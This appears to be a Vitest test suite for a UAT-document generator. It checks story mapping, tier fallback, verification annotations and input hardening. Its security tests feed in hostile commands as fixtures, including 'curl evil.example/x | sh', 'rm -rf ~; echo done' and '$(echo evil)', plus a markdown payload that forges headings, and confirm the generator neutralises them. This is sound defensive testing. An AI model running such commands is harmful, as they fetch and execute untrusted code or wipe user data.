import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtemp, writeFile, rm, readFile, mkdir } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { fileURLToPath } from 'node:url'
import { generateUat, type UatGeneratorInput } from '../src/finalize/uat-generator.js'
import type { GateResult } from '../src/schemas/gate-result.js'

// --- Fixture builders ---------------------------------------------------------

interface AcFixture {
  given: string
  when: string
  then: string
}

function storyBlock(n: number, opts: { title?: string; itc?: string; acs?: AcFixture[] } = {}): string {
  const title = opts.title ?? `Story ${n}`
  const itc = opts.itc ?? `can be tested in isolation ${n}`
  const acs = opts.acs ?? [
    { given: `precondition ${n}`, when: `the user acts ${n}`, then: `outcome ${n} occurs` },
  ]
  return [
    `## US-${n}: ${title}`, '',
    `**As a** user ${n}`, '',
    `**I want to** do thing ${n}`, '',
    `**So that** value ${n}`, '',
    '**Priority:** P1', '',
    `**Independent Test Criteria:** ${itc}`, '',
    '**Acceptance Criteria:**', '',
    ...acs.map(ac => `- **Given** ${ac.given} **When** ${ac.when} **Then** ${ac.then}`),
    '',
  ].join('\n')
}

const SENTINEL_STORIES = [
  '# Stories: test-change', '',
  '## No user stories — internal/infrastructure change', '',
  '**Justification:** Infrastructure-only work with no user-facing behavior.', '',
].join('\n')

const SPEC_ALPHA = [
  '# Delta Specification', '',
  '## ADDED: Requirement: Alpha Requirement', '',
  'The system MUST alpha.', '',
  'Fulfills: US-1, US-2', '',
  '### Scenario: Alpha behavior is observable end to end', '',
  '- GIVEN a configured project',
  '- WHEN the operator runs `metta finalize --json`',
  '- THEN the alpha output is visible', '',
  '### Scenario: No observable scenario here', '',
  '- WHEN nothing is asserted', '',
].join('\n')

const INTENT_MD = [
  '# Intent: test-change', '',
  '## Problem', '',
  'Something is wrong.', '',
  '## Proposal', '',
  '- Add UAT generation at finalize',
  '- Sweep UAT.md into the archive', '',
  '## Out of scope', '',
  '- Nothing', '',
].join('\n')

const SUMMARY_MD = [
  '# Summary: test-change', '',
  'All checks passed after implementing the change.', '',
  '## What changed', '',
  '- Added uat-generator module',
  '- Wired finalizer step 5b', '',
].join('\n')

function passGates(names: string[] = ['tests']): GateResult[] {
  return names.map(gate => ({ gate, status: 'pass' as const, duration_ms: 1 }))
}

async function gen(dir: string, over: Partial<UatGeneratorInput> = {}) {
  return generateUat({
    changeName: 'test-change',
    changeDir: dir,
    generatedAt: '2026-01-15',
    gates: [],
    gatesPassed: true,
    ...over,
  })
}

describe('generateUat', () => {
  let dir: string

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'uat-generator-'))
  })

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 })
  })

  // --- Tier-1 mapping ---------------------------------------------------------

  describe('tier-1 mapping (stories.md)', () => {
    it('maps stories to groups and acceptance criteria to Setup/Do/Observe steps with per-story numbering', async () => {
      const acs1: AcFixture[] = [
        { given: 'precondition 1a', when: 'the user acts 1a', then: 'outcome 1a occurs' },
        { given: 'precondition 1b', when: 'the user acts 1b', then: 'outcome 1b occurs' },
      ]
      const acs2: AcFixture[] = [
        { given: 'precondition 2a', when: 'the user acts 2a', then: 'outcome 2a occurs' },
        { given: 'precondition 2b', when: 'the user acts 2b', then: 'outcome 2b occurs' },
      ]
      await writeFile(join(dir, 'stories.md'), storyBlock(1, { acs: acs1 }) + storyBlock(2, { acs: acs2 }))

      const result = await gen(dir)

      expect(result.tier).toBe('stories')
      expect(result.warnings).toEqual([])
      expect(result.markdown).toContain('# UAT: test-change')
      expect(result.markdown).toContain('- **Generated**: 2026-01-15')
      expect(result.markdown).toContain('- **Source**: user stories (stories.md)')
      expect(result.markdown).toContain('### US-1: Story 1')
      expect(result.markdown).toContain('### US-2: Story 2')
      expect(result.markdown).toContain('*Independent test:* can be tested in isolation 1')
      for (const label of ['#### Step 1.1', '#### Step 1.2', '#### Step 2.1', '#### Step 2.2']) {
        expect(result.markdown).toContain(`${label}\n`)
      }
      expect(result.markdown).toContain('- **Setup**: precondition 1a')
      expect(result.markdown).toContain('- **Do**: the user acts 1a')
      expect(result.markdown).toContain('- **Observe**: outcome 1a occurs')
      expect(result.markdown.match(/- \[ \] Pass/g)).toHaveLength(4)
      expect(result.markdown).not.toContain('### Generation notes')
    })

    it('extracts command hints: AC-local wins, ITC hint only on first step when no AC yielded a command', async () => {
      const s1 = storyBlock(1, {
        itc: 'Run `metta finalize --json` and inspect the output',
        acs: [
          { given: 'a finished change', when: 'the user finalizes it', then: 'a document appears' },
          { given: 'an archive', when: 'they inspect the archive', then: 'the archive contains `UAT.md` and `uat.enabled: false` stays false' },
        ],
      })
      const s2 = storyBlock(2, {
        itc: 'verify with `metta verify` afterwards',
        acs: [
          { given: 'a workspace', when: 'they run `npm run build` to compile', then: 'the build succeeds' },
          { given: 'config `git status` shows clean', when: 'run `npm test` now', then: 'output includes `npm run lint` result' },
        ],
      })
      await writeFile(join(dir, 'stories.md'), s1 + s2)

      const result = await gen(dir)

      // ITC hint attaches to the story's first step (no AC in US-1 yielded a command).
      expect(result.markdown).toContain('- **Do**: the user finalizes it (Run: `metta finalize --json`)')
      // Single-token and non-command spans are rejected.
      expect(result.markdown).toContain('- **Do**: they inspect the archive\n')
      expect(result.markdown).not.toMatch(/\(Run:[^)]*UAT\.md/)
      expect(result.markdown).not.toMatch(/\(Run:[^)]*uat\.enabled/)
      // AC-local command wins in US-2; ITC hint suppressed.
      expect(result.markdown).toContain('- **Do**: they run `npm run build` to compile (Run: `npm run build`)')
      expect(result.markdown).not.toContain('(Run: `metta verify`)')
      // Max 2 hints per step, first-match order.
      expect(result.markdown).toContain('- **Do**: run `npm test` now (Run: `git status`, `npm test`)')
      expect(result.markdown).not.toMatch(/\(Run:[^)]*npm run lint/)
    })
  })

  // --- Delta folding ----------------------------------------------------------

  describe('delta folding (spec.md into story groups)', () => {
    const FOLDING_SPEC = [
      '# Delta Specification', '',
      '## ADDED: Requirement: Alpha Requirement', '',
      'The system MUST alpha.', '',
      'Fulfills: US-2, US-1', '',
      '### Scenario: Multi fulfills scenario lands on lowest story', '',
      '- GIVEN some precondition',
      '- WHEN the operator does the thing',
      '- THEN the outcome is visible', '',
      '## MODIFIED: Requirement: Beta Requirement', '',
      'Fulfills: US-9', '',
      '### Scenario: Dangling scenario goes to additional section', '',
      '- WHEN something happens',
      '- THEN something is observed', '',
      '## REMOVED: Requirement: Gone Requirement', '',
      '### Scenario: Removed scenario must not appear', '',
      '- WHEN removed',
      '- THEN gone', '',
      '## ADDED: Requirement: Dup Requirement', '',
      'Fulfills: US-1', '',
      '### Scenario: Duplicate of an AC', '',
      '- WHEN they run `metta finalize`',
      '- THEN UAT.md exists in the archive', '',
    ].join('\n')

    beforeEach(async () => {
      const s1 = storyBlock(1, {
        acs: [{ given: 'a complete change', when: 'they run `metta finalize`', then: 'UAT.md exists in the archive' }],
      })
      await writeFile(join(dir, 'stories.md'), s1 + storyBlock(2))
      await writeFile(join(dir, 'spec.md'), FOLDING_SPEC)
    })

    it('groups scenarios under the lowest-numbered fulfilled story, after AC steps', async () => {
      const result = await gen(dir)

      expect(result.tier).toBe('stories')
      const us1 = result.markdown.indexOf('### US-1:')
      const us2 = result.markdown.indexOf('### US-2:')
      const folded = result.markdown.indexOf('Multi fulfills scenario lands on lowest story')
      expect(folded).toBeGreaterThan(us1)
      expect(folded).toBeLessThan(us2)
      // Appended after the AC step, per-story numbering continues.
      expect(result.markdown).toContain('#### Step 1.2: Multi fulfills scenario lands on lowest story')
      expect(result.markdown).toContain('- **Setup**: some precondition')
      expect(result.markdown).toContain('- **Do**: the operator does the thing')
      expect(result.markdown).toContain('- **Observe**: the outcome is visible')
    })

    it('routes dangling-fulfills scenarios to an Additional scenarios section', async () => {
      const result = await gen(dir)

      const additional = result.markdown.indexOf('## Additional scenarios')
      expect(additional).toBeGreaterThan(-1)
      const dangling = result.markdown.indexOf('Dangling scenario goes to additional section')
      expect(dangling).toBeGreaterThan(additional)
      // Additional scenarios group is numbered after the two story groups.
      expect(result.markdown).toContain('#### Step 3.1: Dangling scenario goes to additional section')
    })

    it('skips REMOVED scenarios and dedupes exact-normalized restatements of an AC', async () => {
      const result = await gen(dir)

      expect(result.markdown).not.toContain('Removed scenario must not appear')
      expect(result.markdown).not.toContain('Duplicate of an AC')
    })
  })

  // --- Tier fallback ----------------------------------------------------------

  describe('tier fallback', () => {
    it('sentinel stories.md falls back to spec scenarios silently', async () => {
      await writeFile(join(dir, 'stories.md'), SENTINEL_STORIES)
      await writeFile(join(dir, 'spec.md'), SPEC_ALPHA)

      const result = await gen(dir)

      expect(result.tier).toBe('spec')
      expect(result.warnings).toEqual([])
      expect(result.markdown).toContain('- **Source**: spec scenarios (spec.md)')
      expect(result.markdown).toContain('### Alpha Requirement')
      expect(result.markdown).toContain('*Fulfills: US-1, US-2*')
      expect(result.markdown).toContain('#### Step 1.1: Alpha behavior is observable end to end')
      expect(result.markdown).toContain('- **Do**: the operator runs `metta finalize --json` (Run: `metta finalize --json`)')
      // Scenario with no THEN-role step gets the placeholder observable.
      expect(result.markdown).toContain(
        '- **Observe**: (no explicit observable stated — confirm the scenario description holds)',
      )
      expect(result.markdown).not.toContain('### Generation notes')
    })

    it('missing stories.md and spec.md falls back to intent + summary silently', async () => {
      await writeFile(join(dir, 'intent.md'), INTENT_MD)
      await writeFile(join(dir, 'summary.md'), SUMMARY_MD)

      const result = await gen(dir)

      expect(result.tier).toBe('intent-summary')
      expect(result.warnings).toEqual([])
      expect(result.markdown).toContain('- **Source**: intent + summary (reduced)')
      expect(result.markdown).toContain('### Intent proposal')
      expect(result.markdown).toContain('### Summary highlights')
      expect(result.markdown).toContain('All checks passed after implementing the change.')
      expect(result.markdown).toContain('- **Do**: Confirm: Add UAT generation at finalize')
      expect(result.markdown).toContain('- **Do**: Confirm: Added uat-generator module')
      expect(result.markdown).toContain('- **Observe**: behaves as described')
      expect(result.markdown).toContain('#### Step 2.1')
    })

    it('garbage spec.md demotes on content, not on exceptions', async () => {
      await writeFile(join(dir, 'spec.md'), 'just some prose\n\nwithout any delta structure at all\n')
      await writeFile(join(dir, 'intent.md'), INTENT_MD)
      await writeFile(join(dir, 'summary.md'), SUMMARY_MD)

      const result = await gen(dir)

      expect(result.tier).toBe('intent-summary')
      expect(result.warnings).toHaveLength(1)
      expect(result.warnings[0]).toMatch(/spec\.md present but contains no scenarios/)
      expect(result.markdown).toContain('### Generation notes')
      expect(result.markdown).toContain('- spec.md present but contains no scenarios; falling back to intent/summary')
    })

    it('all sources empty emits the floor script with a warning, never skip', async () => {
      const result = await gen(dir)

      expect(result.tier).toBe('floor')
      expect(result.warnings).toHaveLength(1)
      expect(result.markdown).toContain('- **Source**: floor script (no structured sources)')
      expect(result.markdown).toContain('Review the archived change artifacts and confirm the described behavior works')
      expect(result.markdown).toContain('- [ ] Pass')
      expect(result.markdown).toContain('### Generation notes')
    })
  })

  // --- Machine-verified annotation ----------------------------------------------

  describe('machine-verified annotation', () => {
    const CLAUSE1_SPEC = [
      '# Delta', '',
      '## ADDED: Requirement: Frobber', '',
      '### Scenario: Frobnication completes without manual retry', '',
      '- WHEN the user frobnicates',
      '- THEN it completes', '',
    ].join('\n')

    it('clause 1: annotates when normalized summary contains the scenario name (no gates.yaml on disk)', async () => {
      await writeFile(join(dir, 'spec.md'), CLAUSE1_SPEC)
      await writeFile(
        join(dir, 'summary.md'),
        '# Summary\n\nVerified: Frobnication completes without manual retry — all tests pass.\n',
      )

      expect(existsSync(join(dir, 'gates.yaml'))).toBe(false)
      const result = await gen(dir, { gates: passGates(['tests', 'lint']), gatesPassed: true })

      expect(result.tier).toBe('spec')
      expect(result.markdown).toContain(
        '- **Machine-verified** — summary.md references "Frobnication completes without manual retry"; gates all passed (tests, lint)',
      )
    })

    it('clause 2: annotates when normalized summary contains the deriving requirement name', async () => {
      const spec = [
        '# Delta', '',
        '## ADDED: Requirement: Frobnication Pipeline Contract', '',
        '### Scenario: Short check', '',
        '- WHEN checked',
        '- THEN fine', '',
      ].join('\n')
      await writeFile(join(dir, 'spec.md'), spec)
      await writeFile(join(dir, 'summary.md'), '# Summary\n\nFrobnication Pipeline Contract covered by tests.\n')

      const result = await gen(dir, { gates: passGates(), gatesPassed: true })

      expect(result.markdown).toContain(
        '- **Machine-verified** — summary.md references "Frobnication Pipeline Contract"; gates all passed (tests)',
      )
    })

    it('enforces the 15-char normalized floor on name matches', async () => {
      const spec = [
        '# Delta', '',
        '## ADDED: Requirement: Frobber', '',
        '### Scenario: Frob works ok', '',
        '- WHEN frobbed',
        '- THEN ok', '',
      ].join('\n')
      await writeFile(join(dir, 'spec.md'), spec)
      await writeFile(join(dir, 'summary.md'), '# Summary\n\nFrob works ok and Frobber verified by tests.\n')

      const result = await gen(dir, { gates: passGates(), gatesPassed: true })

      expect(result.markdown).not.toContain('Machine-verified')
    })

    it('clause 3: annotates AC steps when a summary line mentions the story id in a verification context', async () => {
      await writeFile(join(dir, 'stories.md'), storyBlock(1))
      await writeFile(join(dir, 'summary.md'), '# Summary\n\nUS-1 verified via integration tests.\n')

      const result = await gen(dir, { gates: passGates(), gatesPassed: true })

      expect(result.markdown).toContain(
        '- **Machine-verified** — summary.md references "US-1"; gates all passed (tests)',
      )
    })

    it('clause 3 guard: a bare narrative mention of the story id does not annotate', async () => {
      await writeFile(join(dir, 'stories.md'), storyBlock(1))
      await writeFile(join(dir, 'summary.md'), '# Summary\n\nUS-1 is about the widget flow.\n')

      const result = await gen(dir, { gates: passGates(), gatesPassed: true })

      expect(result.markdown).not.toContain('Machine-verified')
    })

    it('clause 3 guard: US-12 does not match story US-1', async () => {
      await writeFile(join(dir, 'stories.md'), storyBlock(1))
      await writeFile(join(dir, 'summary.md'), '# Summary\n\nUS-12 verified by tests.\n')

      const result = await gen(dir, { gates: passGates(), gatesPassed: true })

      expect(result.markdown).not.toContain('Machine-verified')
    })

    it('is absent when the gate list is empty (zero gates vacuously pass)', async () => {
      await writeFile(join(dir, 'spec.md'), CLAUSE1_SPEC)
      await writeFile(
        join(dir, 'summary.md'),
        '# Summary\n\nVerified: Frobnication completes without manual retry — all tests pass.\n',
      )

      const result = await gen(dir, { gates: [], gatesPassed: true })

      expect(result.markdown).not.toContain('Machine-verified')
    })

    it('is absent when summary.md is missing, without any warning', async () => {
      await writeFile(join(dir, 'spec.md'), CLAUSE1_SPEC)

      const result = await gen(dir, { gates: passGates(), gatesPassed: true })

      expect(result.markdown).not.toContain('Machine-verified')
      expect(result.warnings).toEqual([])
    })

    it('is structurally skipped at tier 3 even when gates passed', async () => {
      await writeFile(join(dir, 'intent.md'), INTENT_MD)
      await writeFile(join(dir, 'summary.md'), SUMMARY_MD)

      const result = await gen(dir, { gates: passGates(['tests', 'lint']), gatesPassed: true })

      expect(result.tier).toBe('intent-summary')
      expect(result.markdown).not.toContain('Machine-verified')
    })
  })

  // --- Error ladder ------------------------------------------------------------

  describe('error ladder', () => {
    it('malformed stories.md demotes to spec with a warning, never throws', async () => {
      await writeFile(join(dir, 'stories.md'), '## US-1: Broken story\n\nNo required fields here.\n')
      await writeFile(join(dir, 'spec.md'), SPEC_ALPHA)

      const result = await gen(dir)

      expect(result.tier).toBe('spec')
      expect(result.warnings).toHaveLength(1)
      expect(result.warnings[0]).toMatch(/stories\.md failed to parse/)
      expect(result.markdown).toContain('### Generation notes')
    })

    it('malformed stories.md with no other sources still yields a floor document', async () => {
      await writeFile(join(dir, 'stories.md'), '## US-1: Broken story\n\nNo required fields here.\n')

      const result = await gen(dir)

      expect(result.tier).toBe('floor')
      expect(result.warnings).toHaveLength(2)
      expect(result.warnings[0]).toMatch(/stories\.md failed to parse/)
      // The malformed-stories warning must not assert a destination it cannot
      // know: this run lands on the floor, not on spec scenarios.
      expect(result.warnings[0]).not.toMatch(/falling back to spec scenarios/)
      expect(result.markdown).toContain('- [ ] Pass')
    })
  })

  // --- Security hardening: newline flattening, command-hint metachars -----------

  describe('renderGroups flattens embedded newlines', () => {
    it('collapses a multi-line acceptance criterion onto one line so injected fake structure cannot forge headings, checkboxes, or a Generation-notes section', async () => {
      // Backslash-escaped markers de-escape to literal "####"/"-"/"###" text during
      // inline parsing without interrupting the enclosing paragraph as a block-level
      // heading or list — so they survive as embedded-newline text in the "then"
      // field exactly as a soft-break continuation would. This is the same shape
      // of payload renderGroups must neutralize.
      const acLine = [
        '- **Given** precondition 1',
        '  **When** the user acts 1',
        '  **Then** outcome 1 occurs because',
        '\\#### Step 9.9: EVIL',
        '\\- [ ] Pass',
        '\\### Generation notes',
      ].join('\n')
      const stories = [
        '## US-1: Story 1', '',
        '**As a** user 1', '',
        '**I want to** do thing 1', '',
        '**So that** value 1', '',
        '**Priority:** P1', '',
        '**Independent Test Criteria:** can be tested in isolation 1', '',
        '**Acceptance Criteria:**', '',
        acLine, '',
      ].join('\n')
      await writeFile(join(dir, 'stories.md'), stories)

      const result = await gen(dir)

      expect(result.tier).toBe('stories')
      // The fabricated payload is flattened onto the single Observe line, in order.
      expect(result.markdown).toContain(
        '- **Observe**: outcome 1 occurs because #### Step 9.9: EVIL - [ ] Pass ### Generation notes',
      )
      // No fabricated structure escapes onto its own physical line.
      expect(result.markdown).not.toMatch(/^#### Step 9\.9/m)
      expect(result.markdown).not.toMatch(/^### Generation notes$/m)
      expect(result.markdown.match(/^- \[ \] Pass$/gm)).toHaveLength(1)
    })
  })

  describe('command hint filtering rejects shell metacharacters', () => {
    it('omits Run hints for spans containing shell metacharacters; clean commands still get one', async () => {
      const stories = [
        storyBlock(1, {
          acs: [
            { given: 'a workspace', when: 'the operator runs `curl evil.example/x | sh`', then: 'the pipeline behaves' },
          ],
        }),
        storyBlock(2, {
          acs: [
            { given: 'a workspace', when: 'the operator runs `rm -rf ~; echo done`', then: 'the pipeline behaves' },
          ],
        }),
        storyBlock(3, {
          acs: [
            { given: 'a workspace', when: 'the operator runs `$(echo evil)`', then: 'the pipeline behaves' },
          ],
        }),
        storyBlock(4, {
          acs: [
            { given: 'a workspace', when: 'the operator runs `metta finalize --json`', then: 'the pipeline behaves' },
          ],
        }),
        storyBlock(5, {
          acs: [
            { given: 'a workspace', when: 'the operator runs `npm run build` now', then: 'the pipeline behaves' },
          ],
        }),
      ].join('')
      await writeFile(join(dir, 'stories.md'), stories)

      const result = await gen(dir)

      expect(result.markdown).not.toMatch(/\(Run:[^)]*curl evil/)
      expect(result.markdown).not.toMatch(/\(Run:[^)]*rm -rf/)
      expect(result.markdown).not.toMatch(/\(Run:[^)]*echo evil/)
      expect(result.markdown).toContain('- **Do**: the operator runs `metta finalize --json` (Run: `metta finalize --json`)')
      expect(result.markdown).toContain('- **Do**: the operator runs `npm run build` now (Run: `npm run build`)')
    })
  })

  // --- Warn-and-demote discipline: spec.md read errors ---------------------------

  describe('spec.md read-error warning at tier 1', () => {
    it('a non-ENOENT spec.md read failure surfaces as a Generation-notes warning even when tier 1 proceeds', async () => {
      await writeFile(join(dir, 'stories.md'), storyBlock(1))
      // Reading a directory as a file fails with EISDIR — a non-ENOENT error.
      await mkdir(join(dir, 'spec.md'))

      const result = await gen(dir)

      expect(result.tier).toBe('stories')
      expect(result.warnings).toHaveLength(1)
      expect(result.warnings[0]).toMatch(/spec\.md could not be read/)
      expect(result.markdown).toContain('### Generation notes')
      expect(result.markdown).toContain('spec.md could not be read')
    })
  })

  // --- ENOENT discrimination is structural, not textual ---------------------------

  describe('stories.md ENOENT discrimination', () => {
    it('missing stories.md demotes silently, but a malformed stories.md whose error message contains "not found" still warns', async () => {
      await writeFile(join(dir, 'intent.md'), INTENT_MD)
      await writeFile(join(dir, 'summary.md'), SUMMARY_MD)

      const missing = await gen(dir)
      expect(missing.tier).toBe('intent-summary')
      expect(missing.warnings).toEqual([])

      // A priority value of "not found" makes StoriesParseError's message contain
      // the substring "not found" for a reason unrelated to ENOENT — pinning that
      // the discrimination is structural (existsSync), not a message.includes check.
      const malformed = [
        '## US-1: Story 1', '',
        '**As a** user 1', '',
        '**I want to** do thing 1', '',
        '**So that** value 1', '',
        '**Priority:** not found', '',
        '**Independent Test Criteria:** can be tested in isolation 1', '',
        '**Acceptance Criteria:**', '',
        '- **Given** precondition **When** the user acts **Then** outcome occurs', '',
      ].join('\n')
      await writeFile(join(dir, 'stories.md'), malformed)

      const result = await gen(dir)

      expect(result.tier).toBe('intent-summary')
      expect(result.warnings).toHaveLength(1)
      expect(result.warnings[0]).toMatch(/stories\.md failed to parse/)
      expect(result.warnings[0]).toMatch(/not found/)
    })
  })

  // --- Determinism ---------------------------------------------------------------

  describe('determinism', () => {
    it('produces byte-identical output on identical inputs with a fixed generatedAt', async () => {
      await writeFile(join(dir, 'stories.md'), storyBlock(1) + storyBlock(2))
      await writeFile(join(dir, 'spec.md'), SPEC_ALPHA)
      await writeFile(join(dir, 'intent.md'), INTENT_MD)
      await writeFile(join(dir, 'summary.md'), SUMMARY_MD)
      const input = { gates: passGates(['tests', 'lint']), gatesPassed: true }

      const first = await gen(dir, input)
      const second = await gen(dir, input)

      expect(Buffer.from(first.markdown).equals(Buffer.from(second.markdown))).toBe(true)
      expect(first.tier).toBe(second.tier)
      expect(first.warnings).toEqual(second.warnings)
      expect(first.markdown).toContain('- **Generated**: 2026-01-15')
    })
  })

  // --- No-AI guard ------------------------------------------------------------------

  describe('no-AI guard', () => {
    it('the generator module never imports an AI provider', async () => {
      const sourcePath = fileURLToPath(new URL('../src/finalize/uat-generator.ts', import.meta.url))
      const source = await readFile(sourcePath, 'utf8')

      expect(source).not.toMatch(/anthropic/i)
    })
  })
})
